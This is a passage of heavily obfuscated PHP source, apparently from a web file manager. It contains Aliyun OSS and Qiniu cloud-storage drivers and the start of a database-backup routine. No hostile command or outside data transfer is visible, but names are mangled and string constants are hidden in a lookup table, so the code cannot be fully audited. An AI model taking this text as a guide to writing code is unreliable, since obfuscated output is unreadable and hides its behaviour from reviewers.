get_file_mime(get_path_ext($á ò”¿®)); if ($ÕïÜ—ÛĞ == $òçÉò[212]) { return parent::fileOut($­¹ƒ°Ï¶, $æğÄÖ¡, $á ò”¿®, $ÔŒ®¦‘¦); } $æğÄÖ¡ = $æğÄÖ¡ ? $òçÉò[1402] : $òçÉò[1403]; $Œ‡øÆ°á = array(OSS\OssClient::OSS_SUB_RESOURCE => $òçÉò[1404] . rawurlencode("{$æğÄÖ¡}\x3b\x66\151\154\x65\x6e\141\155\145\75{$á ò”¿®}")); $Œ‡øÆ°á[OSS\OssClient::OSS_SUB_RESOURCE] .= $òçÉò[1405] . rawurlencode($ÕïÜ—ÛĞ); $ÇÊ…¤ü = $this->link($­¹ƒ°Ï¶, $Œ‡øÆ°á); $this->fileOutLink($ÇÊ…¤ü); } public function fileOutServer($™å¦è, $¾á¿‡“ƒ = false, $÷™Ùğàş = false, $ ‹¨’²‰ = '') { parent::fileOut($™å¦è, $¾á¿‡“ƒ, $÷™Ùğàş, $ ‹¨’²‰); } public function fileOutImage($Âõ“¸, $‰Âº•• = 250) { $Áá‘Ïâä = array(OSS\OssClient::OSS_PROCESS => $_SERVER[® ¨Ä®ñ][1406] . $‰Âº••); $¨Ú€›‹£ = $this->link($Âõ“¸, $Áá‘Ïâä); $this->fileOutLink($¨Ú€›‹£); } public function fileOutImageServer($–ìš™µ, $€Òù¨äó = 250) { parent::fileOutImage($–ìš™µ, $€Òù¨äó); } public function fileOutLink($É–Í‰–Š) { $ß…Ş’ =& $_SERVER[® ¨Ä®ñ]; if (!$this->isCdnHost() && substr($É–Í‰–Š, 0, 7) == $ß…Ş’[1307]) { $É–Í‰–Š = $ß…Ş’[1308] . substr($É–Í‰–Š, 7); } header($ß…Ş’[158] . $É–Í‰–Š); die; } public function hashMd5($Ñ‡Ğ–îœ, $­„•¶§™ = '') { $ş—ÄÙ¨ =& $_SERVER[® ¨Ä®ñ]; $«ËÈì—¹ = $this->_objectMeta($Ñ‡Ğ–îœ); if (!$«ËÈì—¹) { return $ş—ÄÙ¨[12]; } if (!isset($«ËÈì—¹[$ş—ÄÙ¨[1381]]) && !empty($­„•¶§™)) { $©ô¨±ßƒ = $this->updateObjMeta($Ñ‡Ğ–îœ, array($ş—ÄÙ¨[1381] => $­„•¶§™)); $«ËÈì—¹[$ş—ÄÙ¨[1381]] = $©ô¨±ßƒ ? $­„•¶§™ : $ş—ÄÙ¨[12]; } return isset($«ËÈì—¹[$ş—ÄÙ¨[1381]]) ? strtolower($«ËÈì—¹[$ş—ÄÙ¨[1381]]) : $ş—ÄÙ¨[12]; } public function size($ÙóØğò·) { $Ì›ßÅÜ¼ = $this->objectMeta($ÙóØğò·); return $Ì›ßÅÜ¼ ? $Ì›ßÅÜ¼[$_SERVER[® ¨Ä®ñ][80]] : 0; } public function info($Æ†ó÷ÏÆ) { if ($this->isFolder($Æ†ó÷ÏÆ)) { return $this->folderInfo($Æ†ó÷ÏÆ); } else { if ($this->isFile($Æ†ó÷ÏÆ)) { return $this->fileInfo($Æ†ó÷ÏÆ); } } return !1; } public function exist($†á™Ã†) { return $this->isFile($†á™Ã†) || $this->isFolder($†á™Ã†); } public function isFile($¦İ‚¾µ¥) { return !$this->isFolder($¦İ‚¾µ¥) && $this->objectMeta($¦İ‚¾µ¥); } public function isFolder($ùò­®ÑÃ) { return $this->cacheMethod($_SERVER[® ¨Ä®ñ][198], $ùò­®ÑÃ); } protected function objectMeta($ˆ°û¨é) { return $this->cacheMethod($_SERVER[® ¨Ä®ñ][199], $ˆ°û¨é); } protected function _objectMeta($é‡ÑŒéğ) { $ÖÃËê¼› =& $_SERVER[® ¨Ä®ñ]; try { $‹ˆ×…¬Š = $this->client->getObjectMeta($this->bucket, $this->pathEncode($é‡ÑŒéğ)); } catch (OSS\Core\OssException $¨£ƒ¦¾) { $‹ˆ×…¬Š = !1; } if ($‹ˆ×…¬Š) { $‹ˆ×…¬Š[$ÖÃËê¼›[80]] = intval($‹ˆ×…¬Š[$ÖÃËê¼›[1379]]); } return $‹ˆ×…¬Š; } protected function _isFolder($ôù´ƒÆÓ) { $èÃ¶öçŸ =& $_SERVER[® ¨Ä®ñ]; if ($ôù´ƒÆÓ == $èÃ¶öçŸ[12] || $ôù´ƒÆÓ == $èÃ¶öçŸ[8]) { return !0; } $ƒºÁ¾Ã® = array($èÃ¶öçŸ[1375] => $èÃ¶öçŸ[8], $èÃ¶öçŸ[1376] => rtrim($ôù´ƒÆÓ, $èÃ¶öçŸ[8]) . $èÃ¶öçŸ[8], $èÃ¶öçŸ[1377] => 1, $èÃ¶öçŸ[1378] => $èÃ¶öçŸ[12]); $¼¶¤Ïì· = $this->client->listObjects($this->bucket, $ƒºÁ¾Ã®); if ($¼¶¤Ïì·->getObjectList() || $¼¶¤Ïì·->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($†ôÌØÉ) { parent::__construct(); require_once SDK_DIR . $_SERVER[® ¨Ä®ñ][1407]; $this->_init($†ôÌØÉ); } public function _init($‡Áî…§Î) { $³ïİŠ—Ú =& $_SERVER[® ¨Ä®ñ]; foreach ($‡Áî…§Î as $çø”’Íˆ => $õñ¤™Õú) { if (isset($this->{$çø”’Íˆ})) { $this->{$çø”’Íˆ} = $õñ¤™Õú; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($³ïİŠ—Ú[1408] . LNG($³ïİŠ—Ú[1366])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¤Ù‹Ã‹•, $œâ„øâ‚ = '', $Æü‡ŸÌ¿ = REPEAT_RENAME) { if ($this->setContent($¤Ù‹Ã‹•, $œâ„øâ‚)) { return $this->getPathOuter($¤Ù‹Ã‹•); } return !1; } public function mkdir($üå—ıÚ, $Ã÷ŸÒ„’ = REPEAT_SKIP) { $Ìô»€¬š =& $_SERVER[® ¨Ä®ñ]; $Ù´§Î— = trim($üå—ıÚ, $Ìô»€¬š[8]); if ($this->_isFolder($Ù´§Î—)) { return $this->getPathOuter($Ù´§Î—); } $üå—ıÚ = $Ù´§Î— . $Ìô»€¬š[8]; $¥Ò·Şµâ = get_path_this($Ù´§Î—); $åÜ×Ü—³ = $üå—ıÚ . $¥Ò·Şµâ; if (!$this->mkfile($åÜ×Ü—³)) { return !1; } if (!$this->moveFile($åÜ×Ü—³, $üå—ıÚ)) { $this->delFile($åÜ×Ü—³); return !1; } return $this->getPathOuter($Ù´§Î—); } public function copyFile($êŞÇ½Ï, $èË”ìÂÌ) { $ùËúªª² = $this->bucketManager->copy($this->bucket, $êŞÇ½Ï, $this->bucket, $èË”ìÂÌ, !0); return $ùËúªª² ? !1 : $this->getPathOuter($èË”ìÂÌ); } public function moveFile($ä„›¢‚Ğ, $¥‚ÂêÙ) { $Ö‚›“ä = $this->bucketManager->move($this->bucket, $ä„›¢‚Ğ, $this->bucket, $¥‚ÂêÙ, !0); return $Ö‚›“ä ? !1 : $this->getPathOuter($¥‚ÂêÙ); } public function delFile($˜ü‰ã·ˆ) { if (!$this->exist($˜ü‰ã·ˆ)) { return !0; } $ñú±Ê€ì = $this->bucketManager->delete($this->bucket, $˜ü‰ã·ˆ); return $ñú±Ê€ì ? !1 : !0; } public function delFolder($ˆÏçïñ) { $‹š ˜¸ş =& $_SERVER[® ¨Ä®ñ]; if (!$this->exist($ˆÏçïñ)) { return !0; } $this->listItemCache = !1; $Š»÷¹Üß = $this->fileList($ˆÏçïñ); $this->listItemCache = !0; $®ë å = trim($ˆÏçïñ, $‹š ˜¸ş[8]) . $‹š ˜¸ş[8]; if (!empty($ˆÏçïñ) && $ˆÏçïñ !== $‹š ˜¸ş[190] && !in_array($®ë å, $Š»÷¹Üß[$‹š ˜¸ş[77]])) { $Š»÷¹Üß[$‹š ˜¸ş[77]][] = $®ë å; } $È´¾Ë¯ó = $this->delByBatch($Š»÷¹Üß[$‹š ˜¸ş[76]]); if (!$È´¾Ë¯ó) { return !1; } $È´¾Ë¯ó = $this->delByBatch($Š»÷¹Üß[$‹š ˜¸ş[77]]); if (!$È´¾Ë¯ó) { return !1; } return $this->delFile($®ë å); } private function delByBatch($™Ûê—á) { foreach (array_chunk($™Ûê—á, 1000) as $ÄÅÂ±£í) { $ªÎª³ğ = $this->bucketManager->buildBatchDelete($this->bucket, $ÄÅÂ±£í); list($¿êşÖ», $Ê•Èïë”) = $this->bucketManager->batch($ªÎª³ğ); if ($Ê•Èïë”) { return !1; } } return !0; } public function rename($°çöé’÷, $¶ÌÛø´«) { return $this->renameObject($°çöé’÷, $¶ÌÛø´«); } public function fileInfo($Ÿ•Ô×“•, $—È¨¬ä½ = false, $úæ¯üÔŒ = array()) { $ê¾êí¯– =& $_SERVER[® ¨Ä®ñ]; $¯›ášŞ™ = array($ê¾êí¯–[32] => $this->pathThis($Ÿ•Ô×“•), $ê¾êí¯–[78] => $this->getPathOuter($ê¾êí¯–[8] . $Ÿ•Ô×“•), $ê¾êí¯–[33] => $ê¾êí¯–[192], $ê¾êí¯–[80] => isset($úæ¯üÔŒ[$ê¾êí¯–[1409]]) ? $úæ¯üÔŒ[$ê¾êí¯–[1409]] : 0, $ê¾êí¯–[167] => $this->ext($Ÿ•Ô×“•)); if ($—È¨¬ä½) { return $¯›ášŞ™; } $¯›ášŞ™[$ê¾êí¯–[193]] = $¯›ášŞ™[$ê¾êí¯–[86]] = 0; $¯›ášŞ™[$ê¾êí¯–[194]] = $¯›ášŞ™[$ê¾êí¯–[195]] = !0; if (empty($úæ¯üÔŒ)) { $úæ¯üÔŒ = $this->objectMeta($Ÿ•Ô×“•); if (!$úæ¯üÔŒ) { return $¯›ášŞ™; } } if (isset($úæ¯üÔŒ[$ê¾êí¯–[1410]])) { $¯›ášŞ™[$ê¾êí¯–[86]] = substr($úæ¯üÔŒ[$ê¾êí¯–[1410]] . $ê¾êí¯–[12], 0, 10); } if (isset($úæ¯üÔŒ[$ê¾êí¯–[1409]])) { $¯›ášŞ™[$ê¾êí¯–[80]] = $úæ¯üÔŒ[$ê¾êí¯–[1409]]; } return $¯›ášŞ™; } public function folderInfo($»»ôÅ—ş, $‡Ö¸«ê„ = false) { $î‰šÜÀ³ =& $_SERVER[® ¨Ä®ñ]; $­½òîğì = array($î‰šÜÀ³[32] => $this->pathThis($»»ôÅ—ş), $î‰šÜÀ³[78] => $this->getPathOuter($î‰šÜÀ³[8] . $»»ôÅ—ş), $î‰šÜÀ³[33] => $î‰šÜÀ³[79]); if ($‡Ö¸«ê„) { return $­½òîğì; } $­½òîğì[$î‰šÜÀ³[193]] = $­½òîğì[$î‰šÜÀ³[86]] = 0; $­½òîğì[$î‰šÜÀ³[194]] = $­½òîğì[$î‰šÜÀ³[195]] = !0; $»»ôÅ—ş = rtrim($»»ôÅ—ş, $î‰šÜÀ³[8]) . $î‰šÜÀ³[8]; $åñ€Ú¾š = $this->objectMeta($»»ôÅ—ş); if (isset($åñ€Ú¾š[$î‰šÜÀ³[1410]])) { $­½òîğì[$î‰šÜÀ³[86]] = substr($åñ€Ú¾š[$î‰šÜÀ³[1410]] . $î‰šÜÀ³[12], 0, 10); } return $­½òîğì; } public function listPath($ıÖã»®ë, $¯ğ®¶¥ = false) { $ÛüÎÈ£ã =& $_SERVER[® ¨Ä®ñ]; $Û†óéĞí = $this->fileList($ıÖã»®ë, $ÛüÎÈ£ã[8], !0); foreach ($Û†óéĞí[$ÛüÎÈ£ã[77]] as $æªòôõ• => $Á»¬›­Ä) { $Û†óéĞí[$ÛüÎÈ£ã[77]][$æªòôõ•] = $this->folderInfo($Á»¬›­Ä, $¯ğ®¶¥); } foreach ($Û†óéĞí[$ÛüÎÈ£ã[76]] as $æªòôõ• => $Á»¬›­Ä) { $Û†óéĞí[$ÛüÎÈ£ã[76]][$æªòôõ•] = $this->fileInfo($Á»¬›­Ä[$ÛüÎÈ£ã[95]], $¯ğ®¶¥, $Á»¬›­Ä); } return $Û†óéĞí; } public function has($ˆ©É˜»Ÿ, $¿·»Ñ·³ = false, $€€–Ø™ = true) { $„±µÔ‹˜ =& $_SERVER[® ¨Ä®ñ]; $ˆ©É˜»Ÿ = trim($ˆ©É˜»Ÿ, $„±µÔ‹˜[8]); $ÔîùÇ¾» = empty($ˆ©É˜»Ÿ) && $ˆ©É˜»Ÿ !== $„±µÔ‹˜[190] ? $„±µÔ‹˜[12] : $ˆ©É˜»Ÿ . $„±µÔ‹˜[8]; $§óùÏ›î = $„±µÔ‹˜[12]; $º¡³å±Ä = 500; $¯êìÆÈ» = $„±µÔ‹˜[8]; $Äì³Úû’ = $Í‘ì½ô· = 0; while (!0) { check_abort(); list($’º¸°å™, $–²¡˜äâ) = $this->bucketManager->listFiles($this->bucket, $ÔîùÇ¾», $§óùÏ›î, $º¡³å±Ä, $¯êìÆÈ»); if ($–²¡˜äâ) { break; } $§óùÏ›î = array_key_exists($„±µÔ‹˜[1378], $’º¸°å™) ? $§óùÏ›î = $’º¸°å™[$„±µÔ‹˜[1411]] : $„±µÔ‹˜[12]; if ($¿·»Ñ·³) { if (!empty($’º¸°å™[$„±µÔ‹˜[1412]])) { $Äì³Úû’ += count($’º¸°å™[$„±µÔ‹˜[1412]]); } if (!empty($’º¸°å™[$„±µÔ‹˜[1413]])) { $Í‘ì½ô· += count($’º¸°å™[$„±µÔ‹˜[1413]]); } if ($§óùÏ›î === $„±µÔ‹˜[12]) { break; } continue; } if ($€€–Ø™) { if (!empty($’º¸°å™[$„±µÔ‹˜[1412]])) { return !0; } } else { if (!empty($’º¸°å™[$„±µÔ‹˜[1413]])) { return !0; } } if ($§óùÏ›î === $„±µÔ‹˜[12]) { break; } } if ($¿·»Ñ·³) { return array($„±µÔ‹˜[202] => $Äì³Úû’, $„±µÔ‹˜[203] => $Í‘ì½ô·); } return !1; } public function listAll($õï¡¬¤±) { $şı·Õ¤§ =& $_SERVER[® ¨Ä®ñ]; $æúÃ‹‚¡ = $this->fileList($õï¡¬¤±, $şı·Õ¤§[12], !0); $ïšŒ¼Å = array(); foreach ($æúÃ‹‚¡[$şı·Õ¤§[76]] as $¾ÕÌåôı) { $ïšŒ¼Å[$¾ÕÌåôı[$şı·Õ¤§[95]]] = $¾ÕÌåôı[$şı·Õ¤§[80]]; } foreach ($æúÃ‹‚¡[$şı·Õ¤§[77]] as $¾ÕÌåôı) { if (is_string($¾ÕÌåôı)) { $ïšŒ¼Å[$¾ÕÌåôı] = 0; } } return $this->listAllFiles($õï¡¬¤±, array_keys($ïšŒ¼Å), $ïšŒ¼Å); } private function fileList($™úô­öø, $å¦Ó¬é = '', $§˜µ¯ = 0) { $á«¦ÍÓ =& $_SERVER[® ¨Ä®ñ]; $™úô­öø = trim($™úô­öø, $á«¦ÍÓ[8]); $’Ê±Ã×¾ = empty($™úô­öø) && $™úô­öø !== $á«¦ÍÓ[190] ? $á«¦ÍÓ[12] : $™úô­öø . $á«¦ÍÓ[8]; $ÊÆû²Î” = $á«¦ÍÓ[12]; $—ŠİÇ×— = 1000; $ˆ©í¯©À = $this->listItemCache === !1 ? !1 : !0; $…ìÌ¹Ğ = $Òò‹÷˜¾ = array(); while (!0) { check_abort(); list($İƒñŸ¶³, $ë‹—ù‹¹) = $this->bucketManager->listFiles($this->bucket, $’Ê±Ã×¾, $ÊÆû²Î”, $—ŠİÇ×—, $å¦Ó¬é); if ($ë‹—ù‹¹) { break; } $ÊÆû²Î” = array_key_exists($á«¦ÍÓ[1378], $İƒñŸ¶³) ? $ÊÆû²Î” = $İƒñŸ¶³[$á«¦ÍÓ[1411]] : $á«¦ÍÓ[12]; $´¾ß‘» = isset($İƒñŸ¶³[$á«¦ÍÓ[1412]]) ? $İƒñŸ¶³[$á«¦ÍÓ[1412]] : array(); $ÔÌ¤‹Öµ = isset($İƒñŸ¶³[$á«¦ÍÓ[1413]]) ? $İƒñŸ¶³[$á«¦ÍÓ[1413]] : array(); foreach ($´¾ß‘» as $¶£åŸ­ç) { if ($¶£åŸ­ç[$á«¦ÍÓ[95]] == $’Ê±Ã×¾) { continue; } $Şì’œÒò = $¶£åŸ­ç[$á«¦ÍÓ[95]]; $‘âÚÚŸ = $¶£åŸ­ç[$á«¦ÍÓ[1409]]; $¶£åŸ­ç[$á«¦ÍÓ[80]] = $‘âÚÚŸ; $ºÃğØ°“ = $‘âÚÚŸ == 0 && substr($Şì’œÒò, strlen($Şì’œÒò) - 1, 1) == $á«¦ÍÓ[8] ? !0 : !1; if ($ˆ©í¯©À) { $this->cacheMethod($á«¦ÍÓ[198], $Şì’œÒò, $ºÃğØ°“); $this->cacheMethod($á«¦ÍÓ[199], $Şì’œÒò, $¶£åŸ­ç); } if ($ºÃğØ°“) { $…ìÌ¹Ğ[] = $Şì’œÒò; continue; } $Òò‹÷˜¾[] = $§˜µ¯ ? $¶£åŸ­ç : $Şì’œÒò; } foreach ($ÔÌ¤‹Öµ as $Şì’œÒò) { if ($Şì’œÒò == $’Ê±Ã×¾) { continue; } $…ìÌ¹Ğ[] = $Şì’œÒò; if ($ˆ©í¯©À) { $this->cacheMethod($á«¦ÍÓ[198], $Şì’œÒò, !0); } } if ($ÊÆû²Î” === $á«¦ÍÓ[12]) { break; } } if ($ˆ©í¯©À) { $this->cacheMethod($á«¦ÍÓ[198], $™úô­öø, !0); } return array($á«¦ÍÓ[77] => $…ìÌ¹Ğ, $á«¦ÍÓ[76] => $Òò‹÷˜¾); } public function canRead($ÅôİúÖ) { return $this->exist($ÅôİúÖ) ? !0 : !1; } public function canWrite($áñ„”ı) { return $this->exist($áñ„”ı) ? !0 : !1; } public function getContent($¿İÂ‘ÆÁ) { return $this->fileSubstr($¿İÂ‘ÆÁ, 0, -1); } public function setContent($÷şØìÌ, $÷Şç¾€± = '') { $ÛÁîö»Š = $this->tempFile($this->pathThis($÷şØìÌ)); file_put_contents($ÛÁîö»Š, $÷Şç¾€±); if ($this->upload($÷şØìÌ, $ÛÁîö»Š)) { $this->tempFileRemve($ÛÁîö»Š); return !0; } return !1; } public function refreshUrls($Ò¢¯®) { $òÃ…¿Ò =& $_SERVER[® ¨Ä®ñ]; $÷Êú¯  = array(); if (is_array($Ò¢¯®)) { foreach ($Ò¢¯® as $›‚Œ­”ä) { $÷Êú¯ [] = $this->link($›‚Œ­”ä); } } else { $÷Êú¯ [] = $this->link($Ò¢¯®); } $Ïƒ›Ó›Ş = new Qiniu\Cdn\CdnManager($this->auth); list($„Å£Ùç, $ÈªÒñà) = $Ïƒ›Ó›Ş->refreshUrls($÷Êú¯ ); if ($ÈªÒñà) { return !1; } return $„Å£Ùç[$òÃ…¿Ò[1165]] == $òÃ…¿Ò[742] ? !0 : !1; } public function fileSubstr($ÌÈ¡ß§‹, $¦ô¶ı£Æ, $¹Ş“ùóë) { $¸ø²–Ø™ =& $_SERVER[® ¨Ä®ñ]; if (!($îÃ³ª¥ = $this->link($ÌÈ¡ß§‹))) { return !1; } $™ìçæÁØ = !1; if ($¹Ş“ùóë > 0) { $Éöªñ” = $¦ô¶ı£Æ + $¹Ş“ùóë - 1; $™ìçæÁØ = array($¸ø²–Ø™[1414] . $¦ô¶ı£Æ . $¸ø²–Ø™[451] . $Éöªñ”); } $Ÿ™½®ôñ = url_request($îÃ³ª¥, $¸ø²–Ø™[225], !1, $™ìçæÁØ); return $Ÿ™½®ôñ[$¸ø²–Ø™[732]] ? $Ÿ™½®ôñ[$¸ø²–Ø™[1175]] : !1; } public function upload($Ê¼¸Õô÷, $ŠÓğ«’ˆ, $„¥¸”’ƒ = false, $Û§™ª£ = REPEAT_REPLACE) { $îÏœÚ˜ì = new Qiniu\Storage\UploadManager(); $ÅöÁôÌˆ = $this->auth->uploadToken($this->bucket, $Ê¼¸Õô÷); $¢ŸáûÌ = get_file_mime(get_path_ext($ŠÓğ«’ˆ)); list($ıµ»Í–, $Í«¨­Ö) = $îÏœÚ˜ì->putFile($ÅöÁôÌˆ, $Ê¼¸Õô÷, $ŠÓğ«’ˆ, null, $¢ŸáûÌ); return $Í«¨­Ö ? !1 : $this->getPathOuter($Ê¼¸Õô÷); } public function uploadFormData($£ØÓÑş³, $ §Ü¾» = 3600) { return $this->uploadToken($£ØÓÑş³, $ §Ü¾»); } public function multiUploadFormData($ÈÇ®Íşî, $°ùòüî» = 3600) { return $this->uploadToken($ÈÇ®Íşî, $°ùòüî»); } private function uploadToken($û†®¹€Õ, $–Äµığ = 3600) { $˜òôƒ¹ =& $_SERVER[® ¨Ä®ñ]; $–±ä—Ã½ = $–Äµığ; $„³ÈíÆ = array($˜òôƒ¹[1415] => $˜òôƒ¹[1416]); $¡’è‰Ğá = $û†®¹€Õ; $‹ŒÎØºÇ = $this->auth->uploadToken($this->bucket, $¡’è‰Ğá, $–±ä—Ã½, $„³ÈíÆ, !0); $ÈÃØˆĞı = empty($this->region) || $this->region == $˜òôƒ¹[1417] ? $˜òôƒ¹[12] : $˜òôƒ¹[451] . $this->region; $²Á»Ü«ö = http_type() . "\72\57\x2f\x75\160\x6c\x6f\x61\144{$ÈÃØˆĞı}\56\x71\x69\x6e\151\x75\160\x2e\x63\x6f\155\x2f"; return array($˜òôƒ¹[1418] => $‹ŒÎØºÇ, $˜òôƒ¹[1419] => $²Á»Ü«ö); } public function download($ô€¥Ï°Û, $•úØÈÇß) { $Á‹«‡ = IO::getPathInner(IO::mkfile($•úØÈÇß)); if (!($ˆìİşõò = $this->link($ô€¥Ï°Û))) { return !1; } $ó«’–¹ = 0; $µ€†ªˆ¯ = 1024 * 200; $Ùİ¹ÑÄ¼ = fopen($Á‹«‡, $_SERVER[® ¨Ä®ñ][1420]); while (!0) { $Ş›ŞÈâØ = $this->fileSubstr($ô€¥Ï°Û, $ó«’–¹, $µ€†ªˆ¯); if ($Ş›ŞÈâØ === !1) { return !1; } fwrite($Ùİ¹ÑÄ¼, $Ş›ŞÈâØ); $ó«’–¹ += $µ€†ªˆ¯; if (strlen($Ş›ŞÈâØ) < $µ€†ªˆ¯) { break; } } fclose($Ùİ¹ÑÄ¼); return $•úØÈÇß; } public function link($¸ÓúŸ±Ñ, $Ô³Û˜Èá = '') { if (!$this->isFile($¸ÓúŸ±Ñ)) { return !1; } $š‹”ƒè = $this->getHost() . $_SERVER[® ¨Ä®ñ][8] . $this->pathEncode($¸ÓúŸ±Ñ) . $Ô³Û˜Èá; return $this->auth->privateDownloadUrl($š‹”ƒè, 3600 * 12); } public function fileOut($ò”¤Ó‚ì, $Áå”¥‹ˆ = false, $¿¡şª¹  = false, $çÉùùŠš = '') { $çŸç«‰ˆ =& $_SERVER[® ¨Ä®ñ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ò”¤Ó‚ì, $Áå”¥‹ˆ, $¿¡şª¹ , $çÉùùŠš); } if (!$¿¡şª¹ ) { $¿¡şª¹  = $this->pathThis($ò”¤Ó‚ì); } $•Âàòî› = $Áå”¥‹ˆ ? $çŸç«‰ˆ[1421] . rawurlencode($¿¡şª¹ ) : $çŸç«‰ˆ[12]; $¯ä©í—ï = $this->link($ò”¤Ó‚ì, $•Âàòî›); $this->fileOutLink($¯ä©í—ï); } public function fileOutServer($ôÒŠÇ›Ù, $øÄ»ö¦ç = false, $ó™à»«Ú = false, $ÒˆÑº“© = '') { parent::fileOut($ôÒŠÇ›Ù, $øÄ»ö¦ç, $ó™à»«Ú, $ÒˆÑº“©); } public function fileOutImage($ëÄ®ôÅÆ, $ö™Š‚Ó = 250) { $şÖ”°Óö = $this->link($ëÄ®ôÅÆ, $_SERVER[® ¨Ä®ñ][1422] . $ö™Š‚Ó); $this->fileOutLink($şÖ”°Óö); } public function fileOutImageServer($âá­Û³û, $Ë‡º¿‘‡ = 250) { parent::fileOutImage($âá­Û³û, $Ë‡º¿‘‡); } public function hashMd5($åå¼ü­¬) { $­¬ŞÌê³ =& $_SERVER[® ¨Ä®ñ]; $¿¥ ´ı» = $this->objectMeta($åå¼ü­¬); return isset($¿¥ ´ı»[$­¬ŞÌê³[207]]) ? $¿¥ ´ı»[$­¬ŞÌê³[207]] : !1; $‘ú™¨Õè = $this->link($åå¼ü­¬, $­¬ŞÌê³[1423]); } public function size($Ğë³½‹â) { $È—İ±¢Ø = $this->objectMeta($Ğë³½‹â); return $È—İ±¢Ø ? $È—İ±¢Ø[$_SERVER[® ¨Ä®ñ][80]] : 0; } public function info($–ï¿éˆ) { if ($this->isFolder($–ï¿éˆ)) { return $this->folderInfo($–ï¿éˆ); } else { if ($this->isFile($–ï¿éˆ)) { return $this->fileInfo($–ï¿éˆ); } } return !1; } public function exist($Ÿ‡ÍÁ†) { return $this->isFile($Ÿ‡ÍÁ†) || $this->isFolder($Ÿ‡ÍÁ†); } public function isFile($âåÁùñ­) { return !$this->isFolder($âåÁùñ­) && $this->objectMeta($âåÁùñ­); } public function isFolder($ÀªŒÂù¬) { return $this->cacheMethod($_SERVER[® ¨Ä®ñ][198], $ÀªŒÂù¬); } protected function objectMeta($ëûŠ¦åº) { return $this->cacheMethod($_SERVER[® ¨Ä®ñ][199], $ëûŠ¦åº); } protected function _objectMeta($Ìãµòš‹) { $Ë³£É€» =& $_SERVER[® ¨Ä®ñ]; list($¿ğâÖ¹, $ÅÓ¨Æ¦€) = $this->bucketManager->stat($this->bucket, $Ìãµòš‹); if ($¿ğâÖ¹) { $¿ğâÖ¹[$Ë³£É€»[80]] = intval($¿ğâÖ¹[$Ë³£É€»[1409]]); } return $¿ğâÖ¹; } protected function _isFolder($†÷ÃŸ°Ì) { $…‰ê€Ô« =& $_SERVER[® ¨Ä®ñ]; if ($†÷ÃŸ°Ì == $…‰ê€Ô«[12] || $†÷ÃŸ°Ì == $…‰ê€Ô«[8]) { return !0; } list($àó²ùşú, $®ªÖ£èà) = $this->bucketManager->listFiles($this->bucket, trim($†÷ÃŸ°Ì, $…‰ê€Ô«[8]) . $…‰ê€Ô«[8], $…‰ê€Ô«[12], 1, $…‰ê€Ô«[8]); return !empty($àó²ùşú[$…‰ê€Ô«[1412]]) || !empty($àó²ùşú[$…‰ê€Ô«[1413]]) ? !0 : !1; } } goto Còö‰¾¸™Ë; E²Æ˜á‚ù: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Ö®ÍÜíû =& $_SERVER[® ¨Ä®ñ]; $îÂ”¢ = Backup::get(); self::$io = $îÂ”¢[$Ö®ÍÜíû[734]]; self::$name = $îÂ”¢[$Ö®ÍÜíû[32]]; $Œêı¬é = new DbManage(); $‡òİÖø¨ = $Œêı¬é->dbType(); $›ººØ¤º = array($Ö®ÍÜíû[758] => $‡òİÖø¨, $Ö®ÍÜíû[759] => time()); Backup::set($›ººØ¤º); $Ø°şî’ğ = $this->tmpFilesPath() . $Ö®ÍÜíû[760] . self::$name . $Ö®ÍÜíû[8]; del_dir($Ø°şî’ğ); mk_dir($Ø°şî’ğ); $ı½Šê¾ = $…Œ°ìÒŠ = 0; $§¯š×•§ = new Task($Ö®ÍÜíû[761], $Ö®ÍÜíû[762], 0, LNG($Ö®ÍÜíû[763]) . $Ö®ÍÜíû[764] . LNG($Ö®ÍÜíû[765])); try { $Òšâò¥Ş = $Œêı¬é->db()->getTables(); } catch (Exception $İçã²«æ) { $§¯š×•§->end(); return !1; } $Òšâò¥Ş = array_diff($Òšâò¥Ş, array($Ö®ÍÜíû[766], $Ö®ÍÜíû[767])); foreach ($Òšâò¥Ş as $³¦¡ëõ“) { $ı½Šê¾ += $Œêı¬é->model($³¦¡ëõ“)->count(); } $§¯š×•§->task[$Ö®ÍÜíû[768]] = $ı½Šê¾; $GLOBALS[$Ö®ÍÜíû[769]] = self::$name; foreach ($Òšâò¥Ş as $³¦¡ëõ“) { $´ƒ†šÏº = $Ø°şî’ğ . $³¦¡ëõ“ . $Ö®ÍÜíû[770]; $‘ú¨•»Ò = null; if ($³¦¡ëõ“ == $Ö®ÍÜíû[771] && (!isset($îÂ”¢[$Ö®ÍÜíû[737]]) || $îÂ”¢[$Ö®ÍÜíû[737]] == $Ö®ÍÜíû[190])) { $‘ú¨•»Ò = self::$io; } $…Œ°ìÒŠ += $Œêı¬é->sqlFromDb($³¦¡ëõ“, $´ƒ†šÏº, $§¯š×•§, $‘ú¨•»Ò); } unset($GLOBALS[$Ö®ÍÜíû[769]]); $§¯š×•§->end(); if ($…Œ°ìÒŠ > $ı½Šê¾) { $ı½Šê¾ = $…Œ°ìÒŠ; } $›ººØ¤º = array($Ö®ÍÜíû[758] => $‡òİÖø¨, $Ö®ÍÜíû[755] => 1, $Ö®ÍÜíû[772] => $ı½Šê¾, $Ö®ÍÜíû[773] => $…Œ°ìÒŠ, $Ö®ÍÜíû[774] => time()); Backup::set($›ººØ¤º); if ($ı½Šê¾ - $…Œ°ìÒŠ > 0) { $Í‘Ë‰Ë = $Ö®ÍÜíû[775]; if (stristr(I18n::getType(), $Ö®ÍÜíû[776])) { $Í‘Ë‰Ë = $Ö®ÍÜíû[777]; } write_log(array($Í‘Ë‰Ë, $›ººØ¤º), $Ö®ÍÜíû[762]); return !1; } return !0; } private function tmpFilesPath() { $˜ĞÙ¿µ£ =& $_SERVER[® ¨Ä®ñ]; $Ç¦‹äÔ³ = TEMP_FILES; if ($GLOBALS[$˜ĞÙ¿µ£[6]][$˜ĞÙ¿µ£[90]][$˜ĞÙ¿µ£[778]]) { 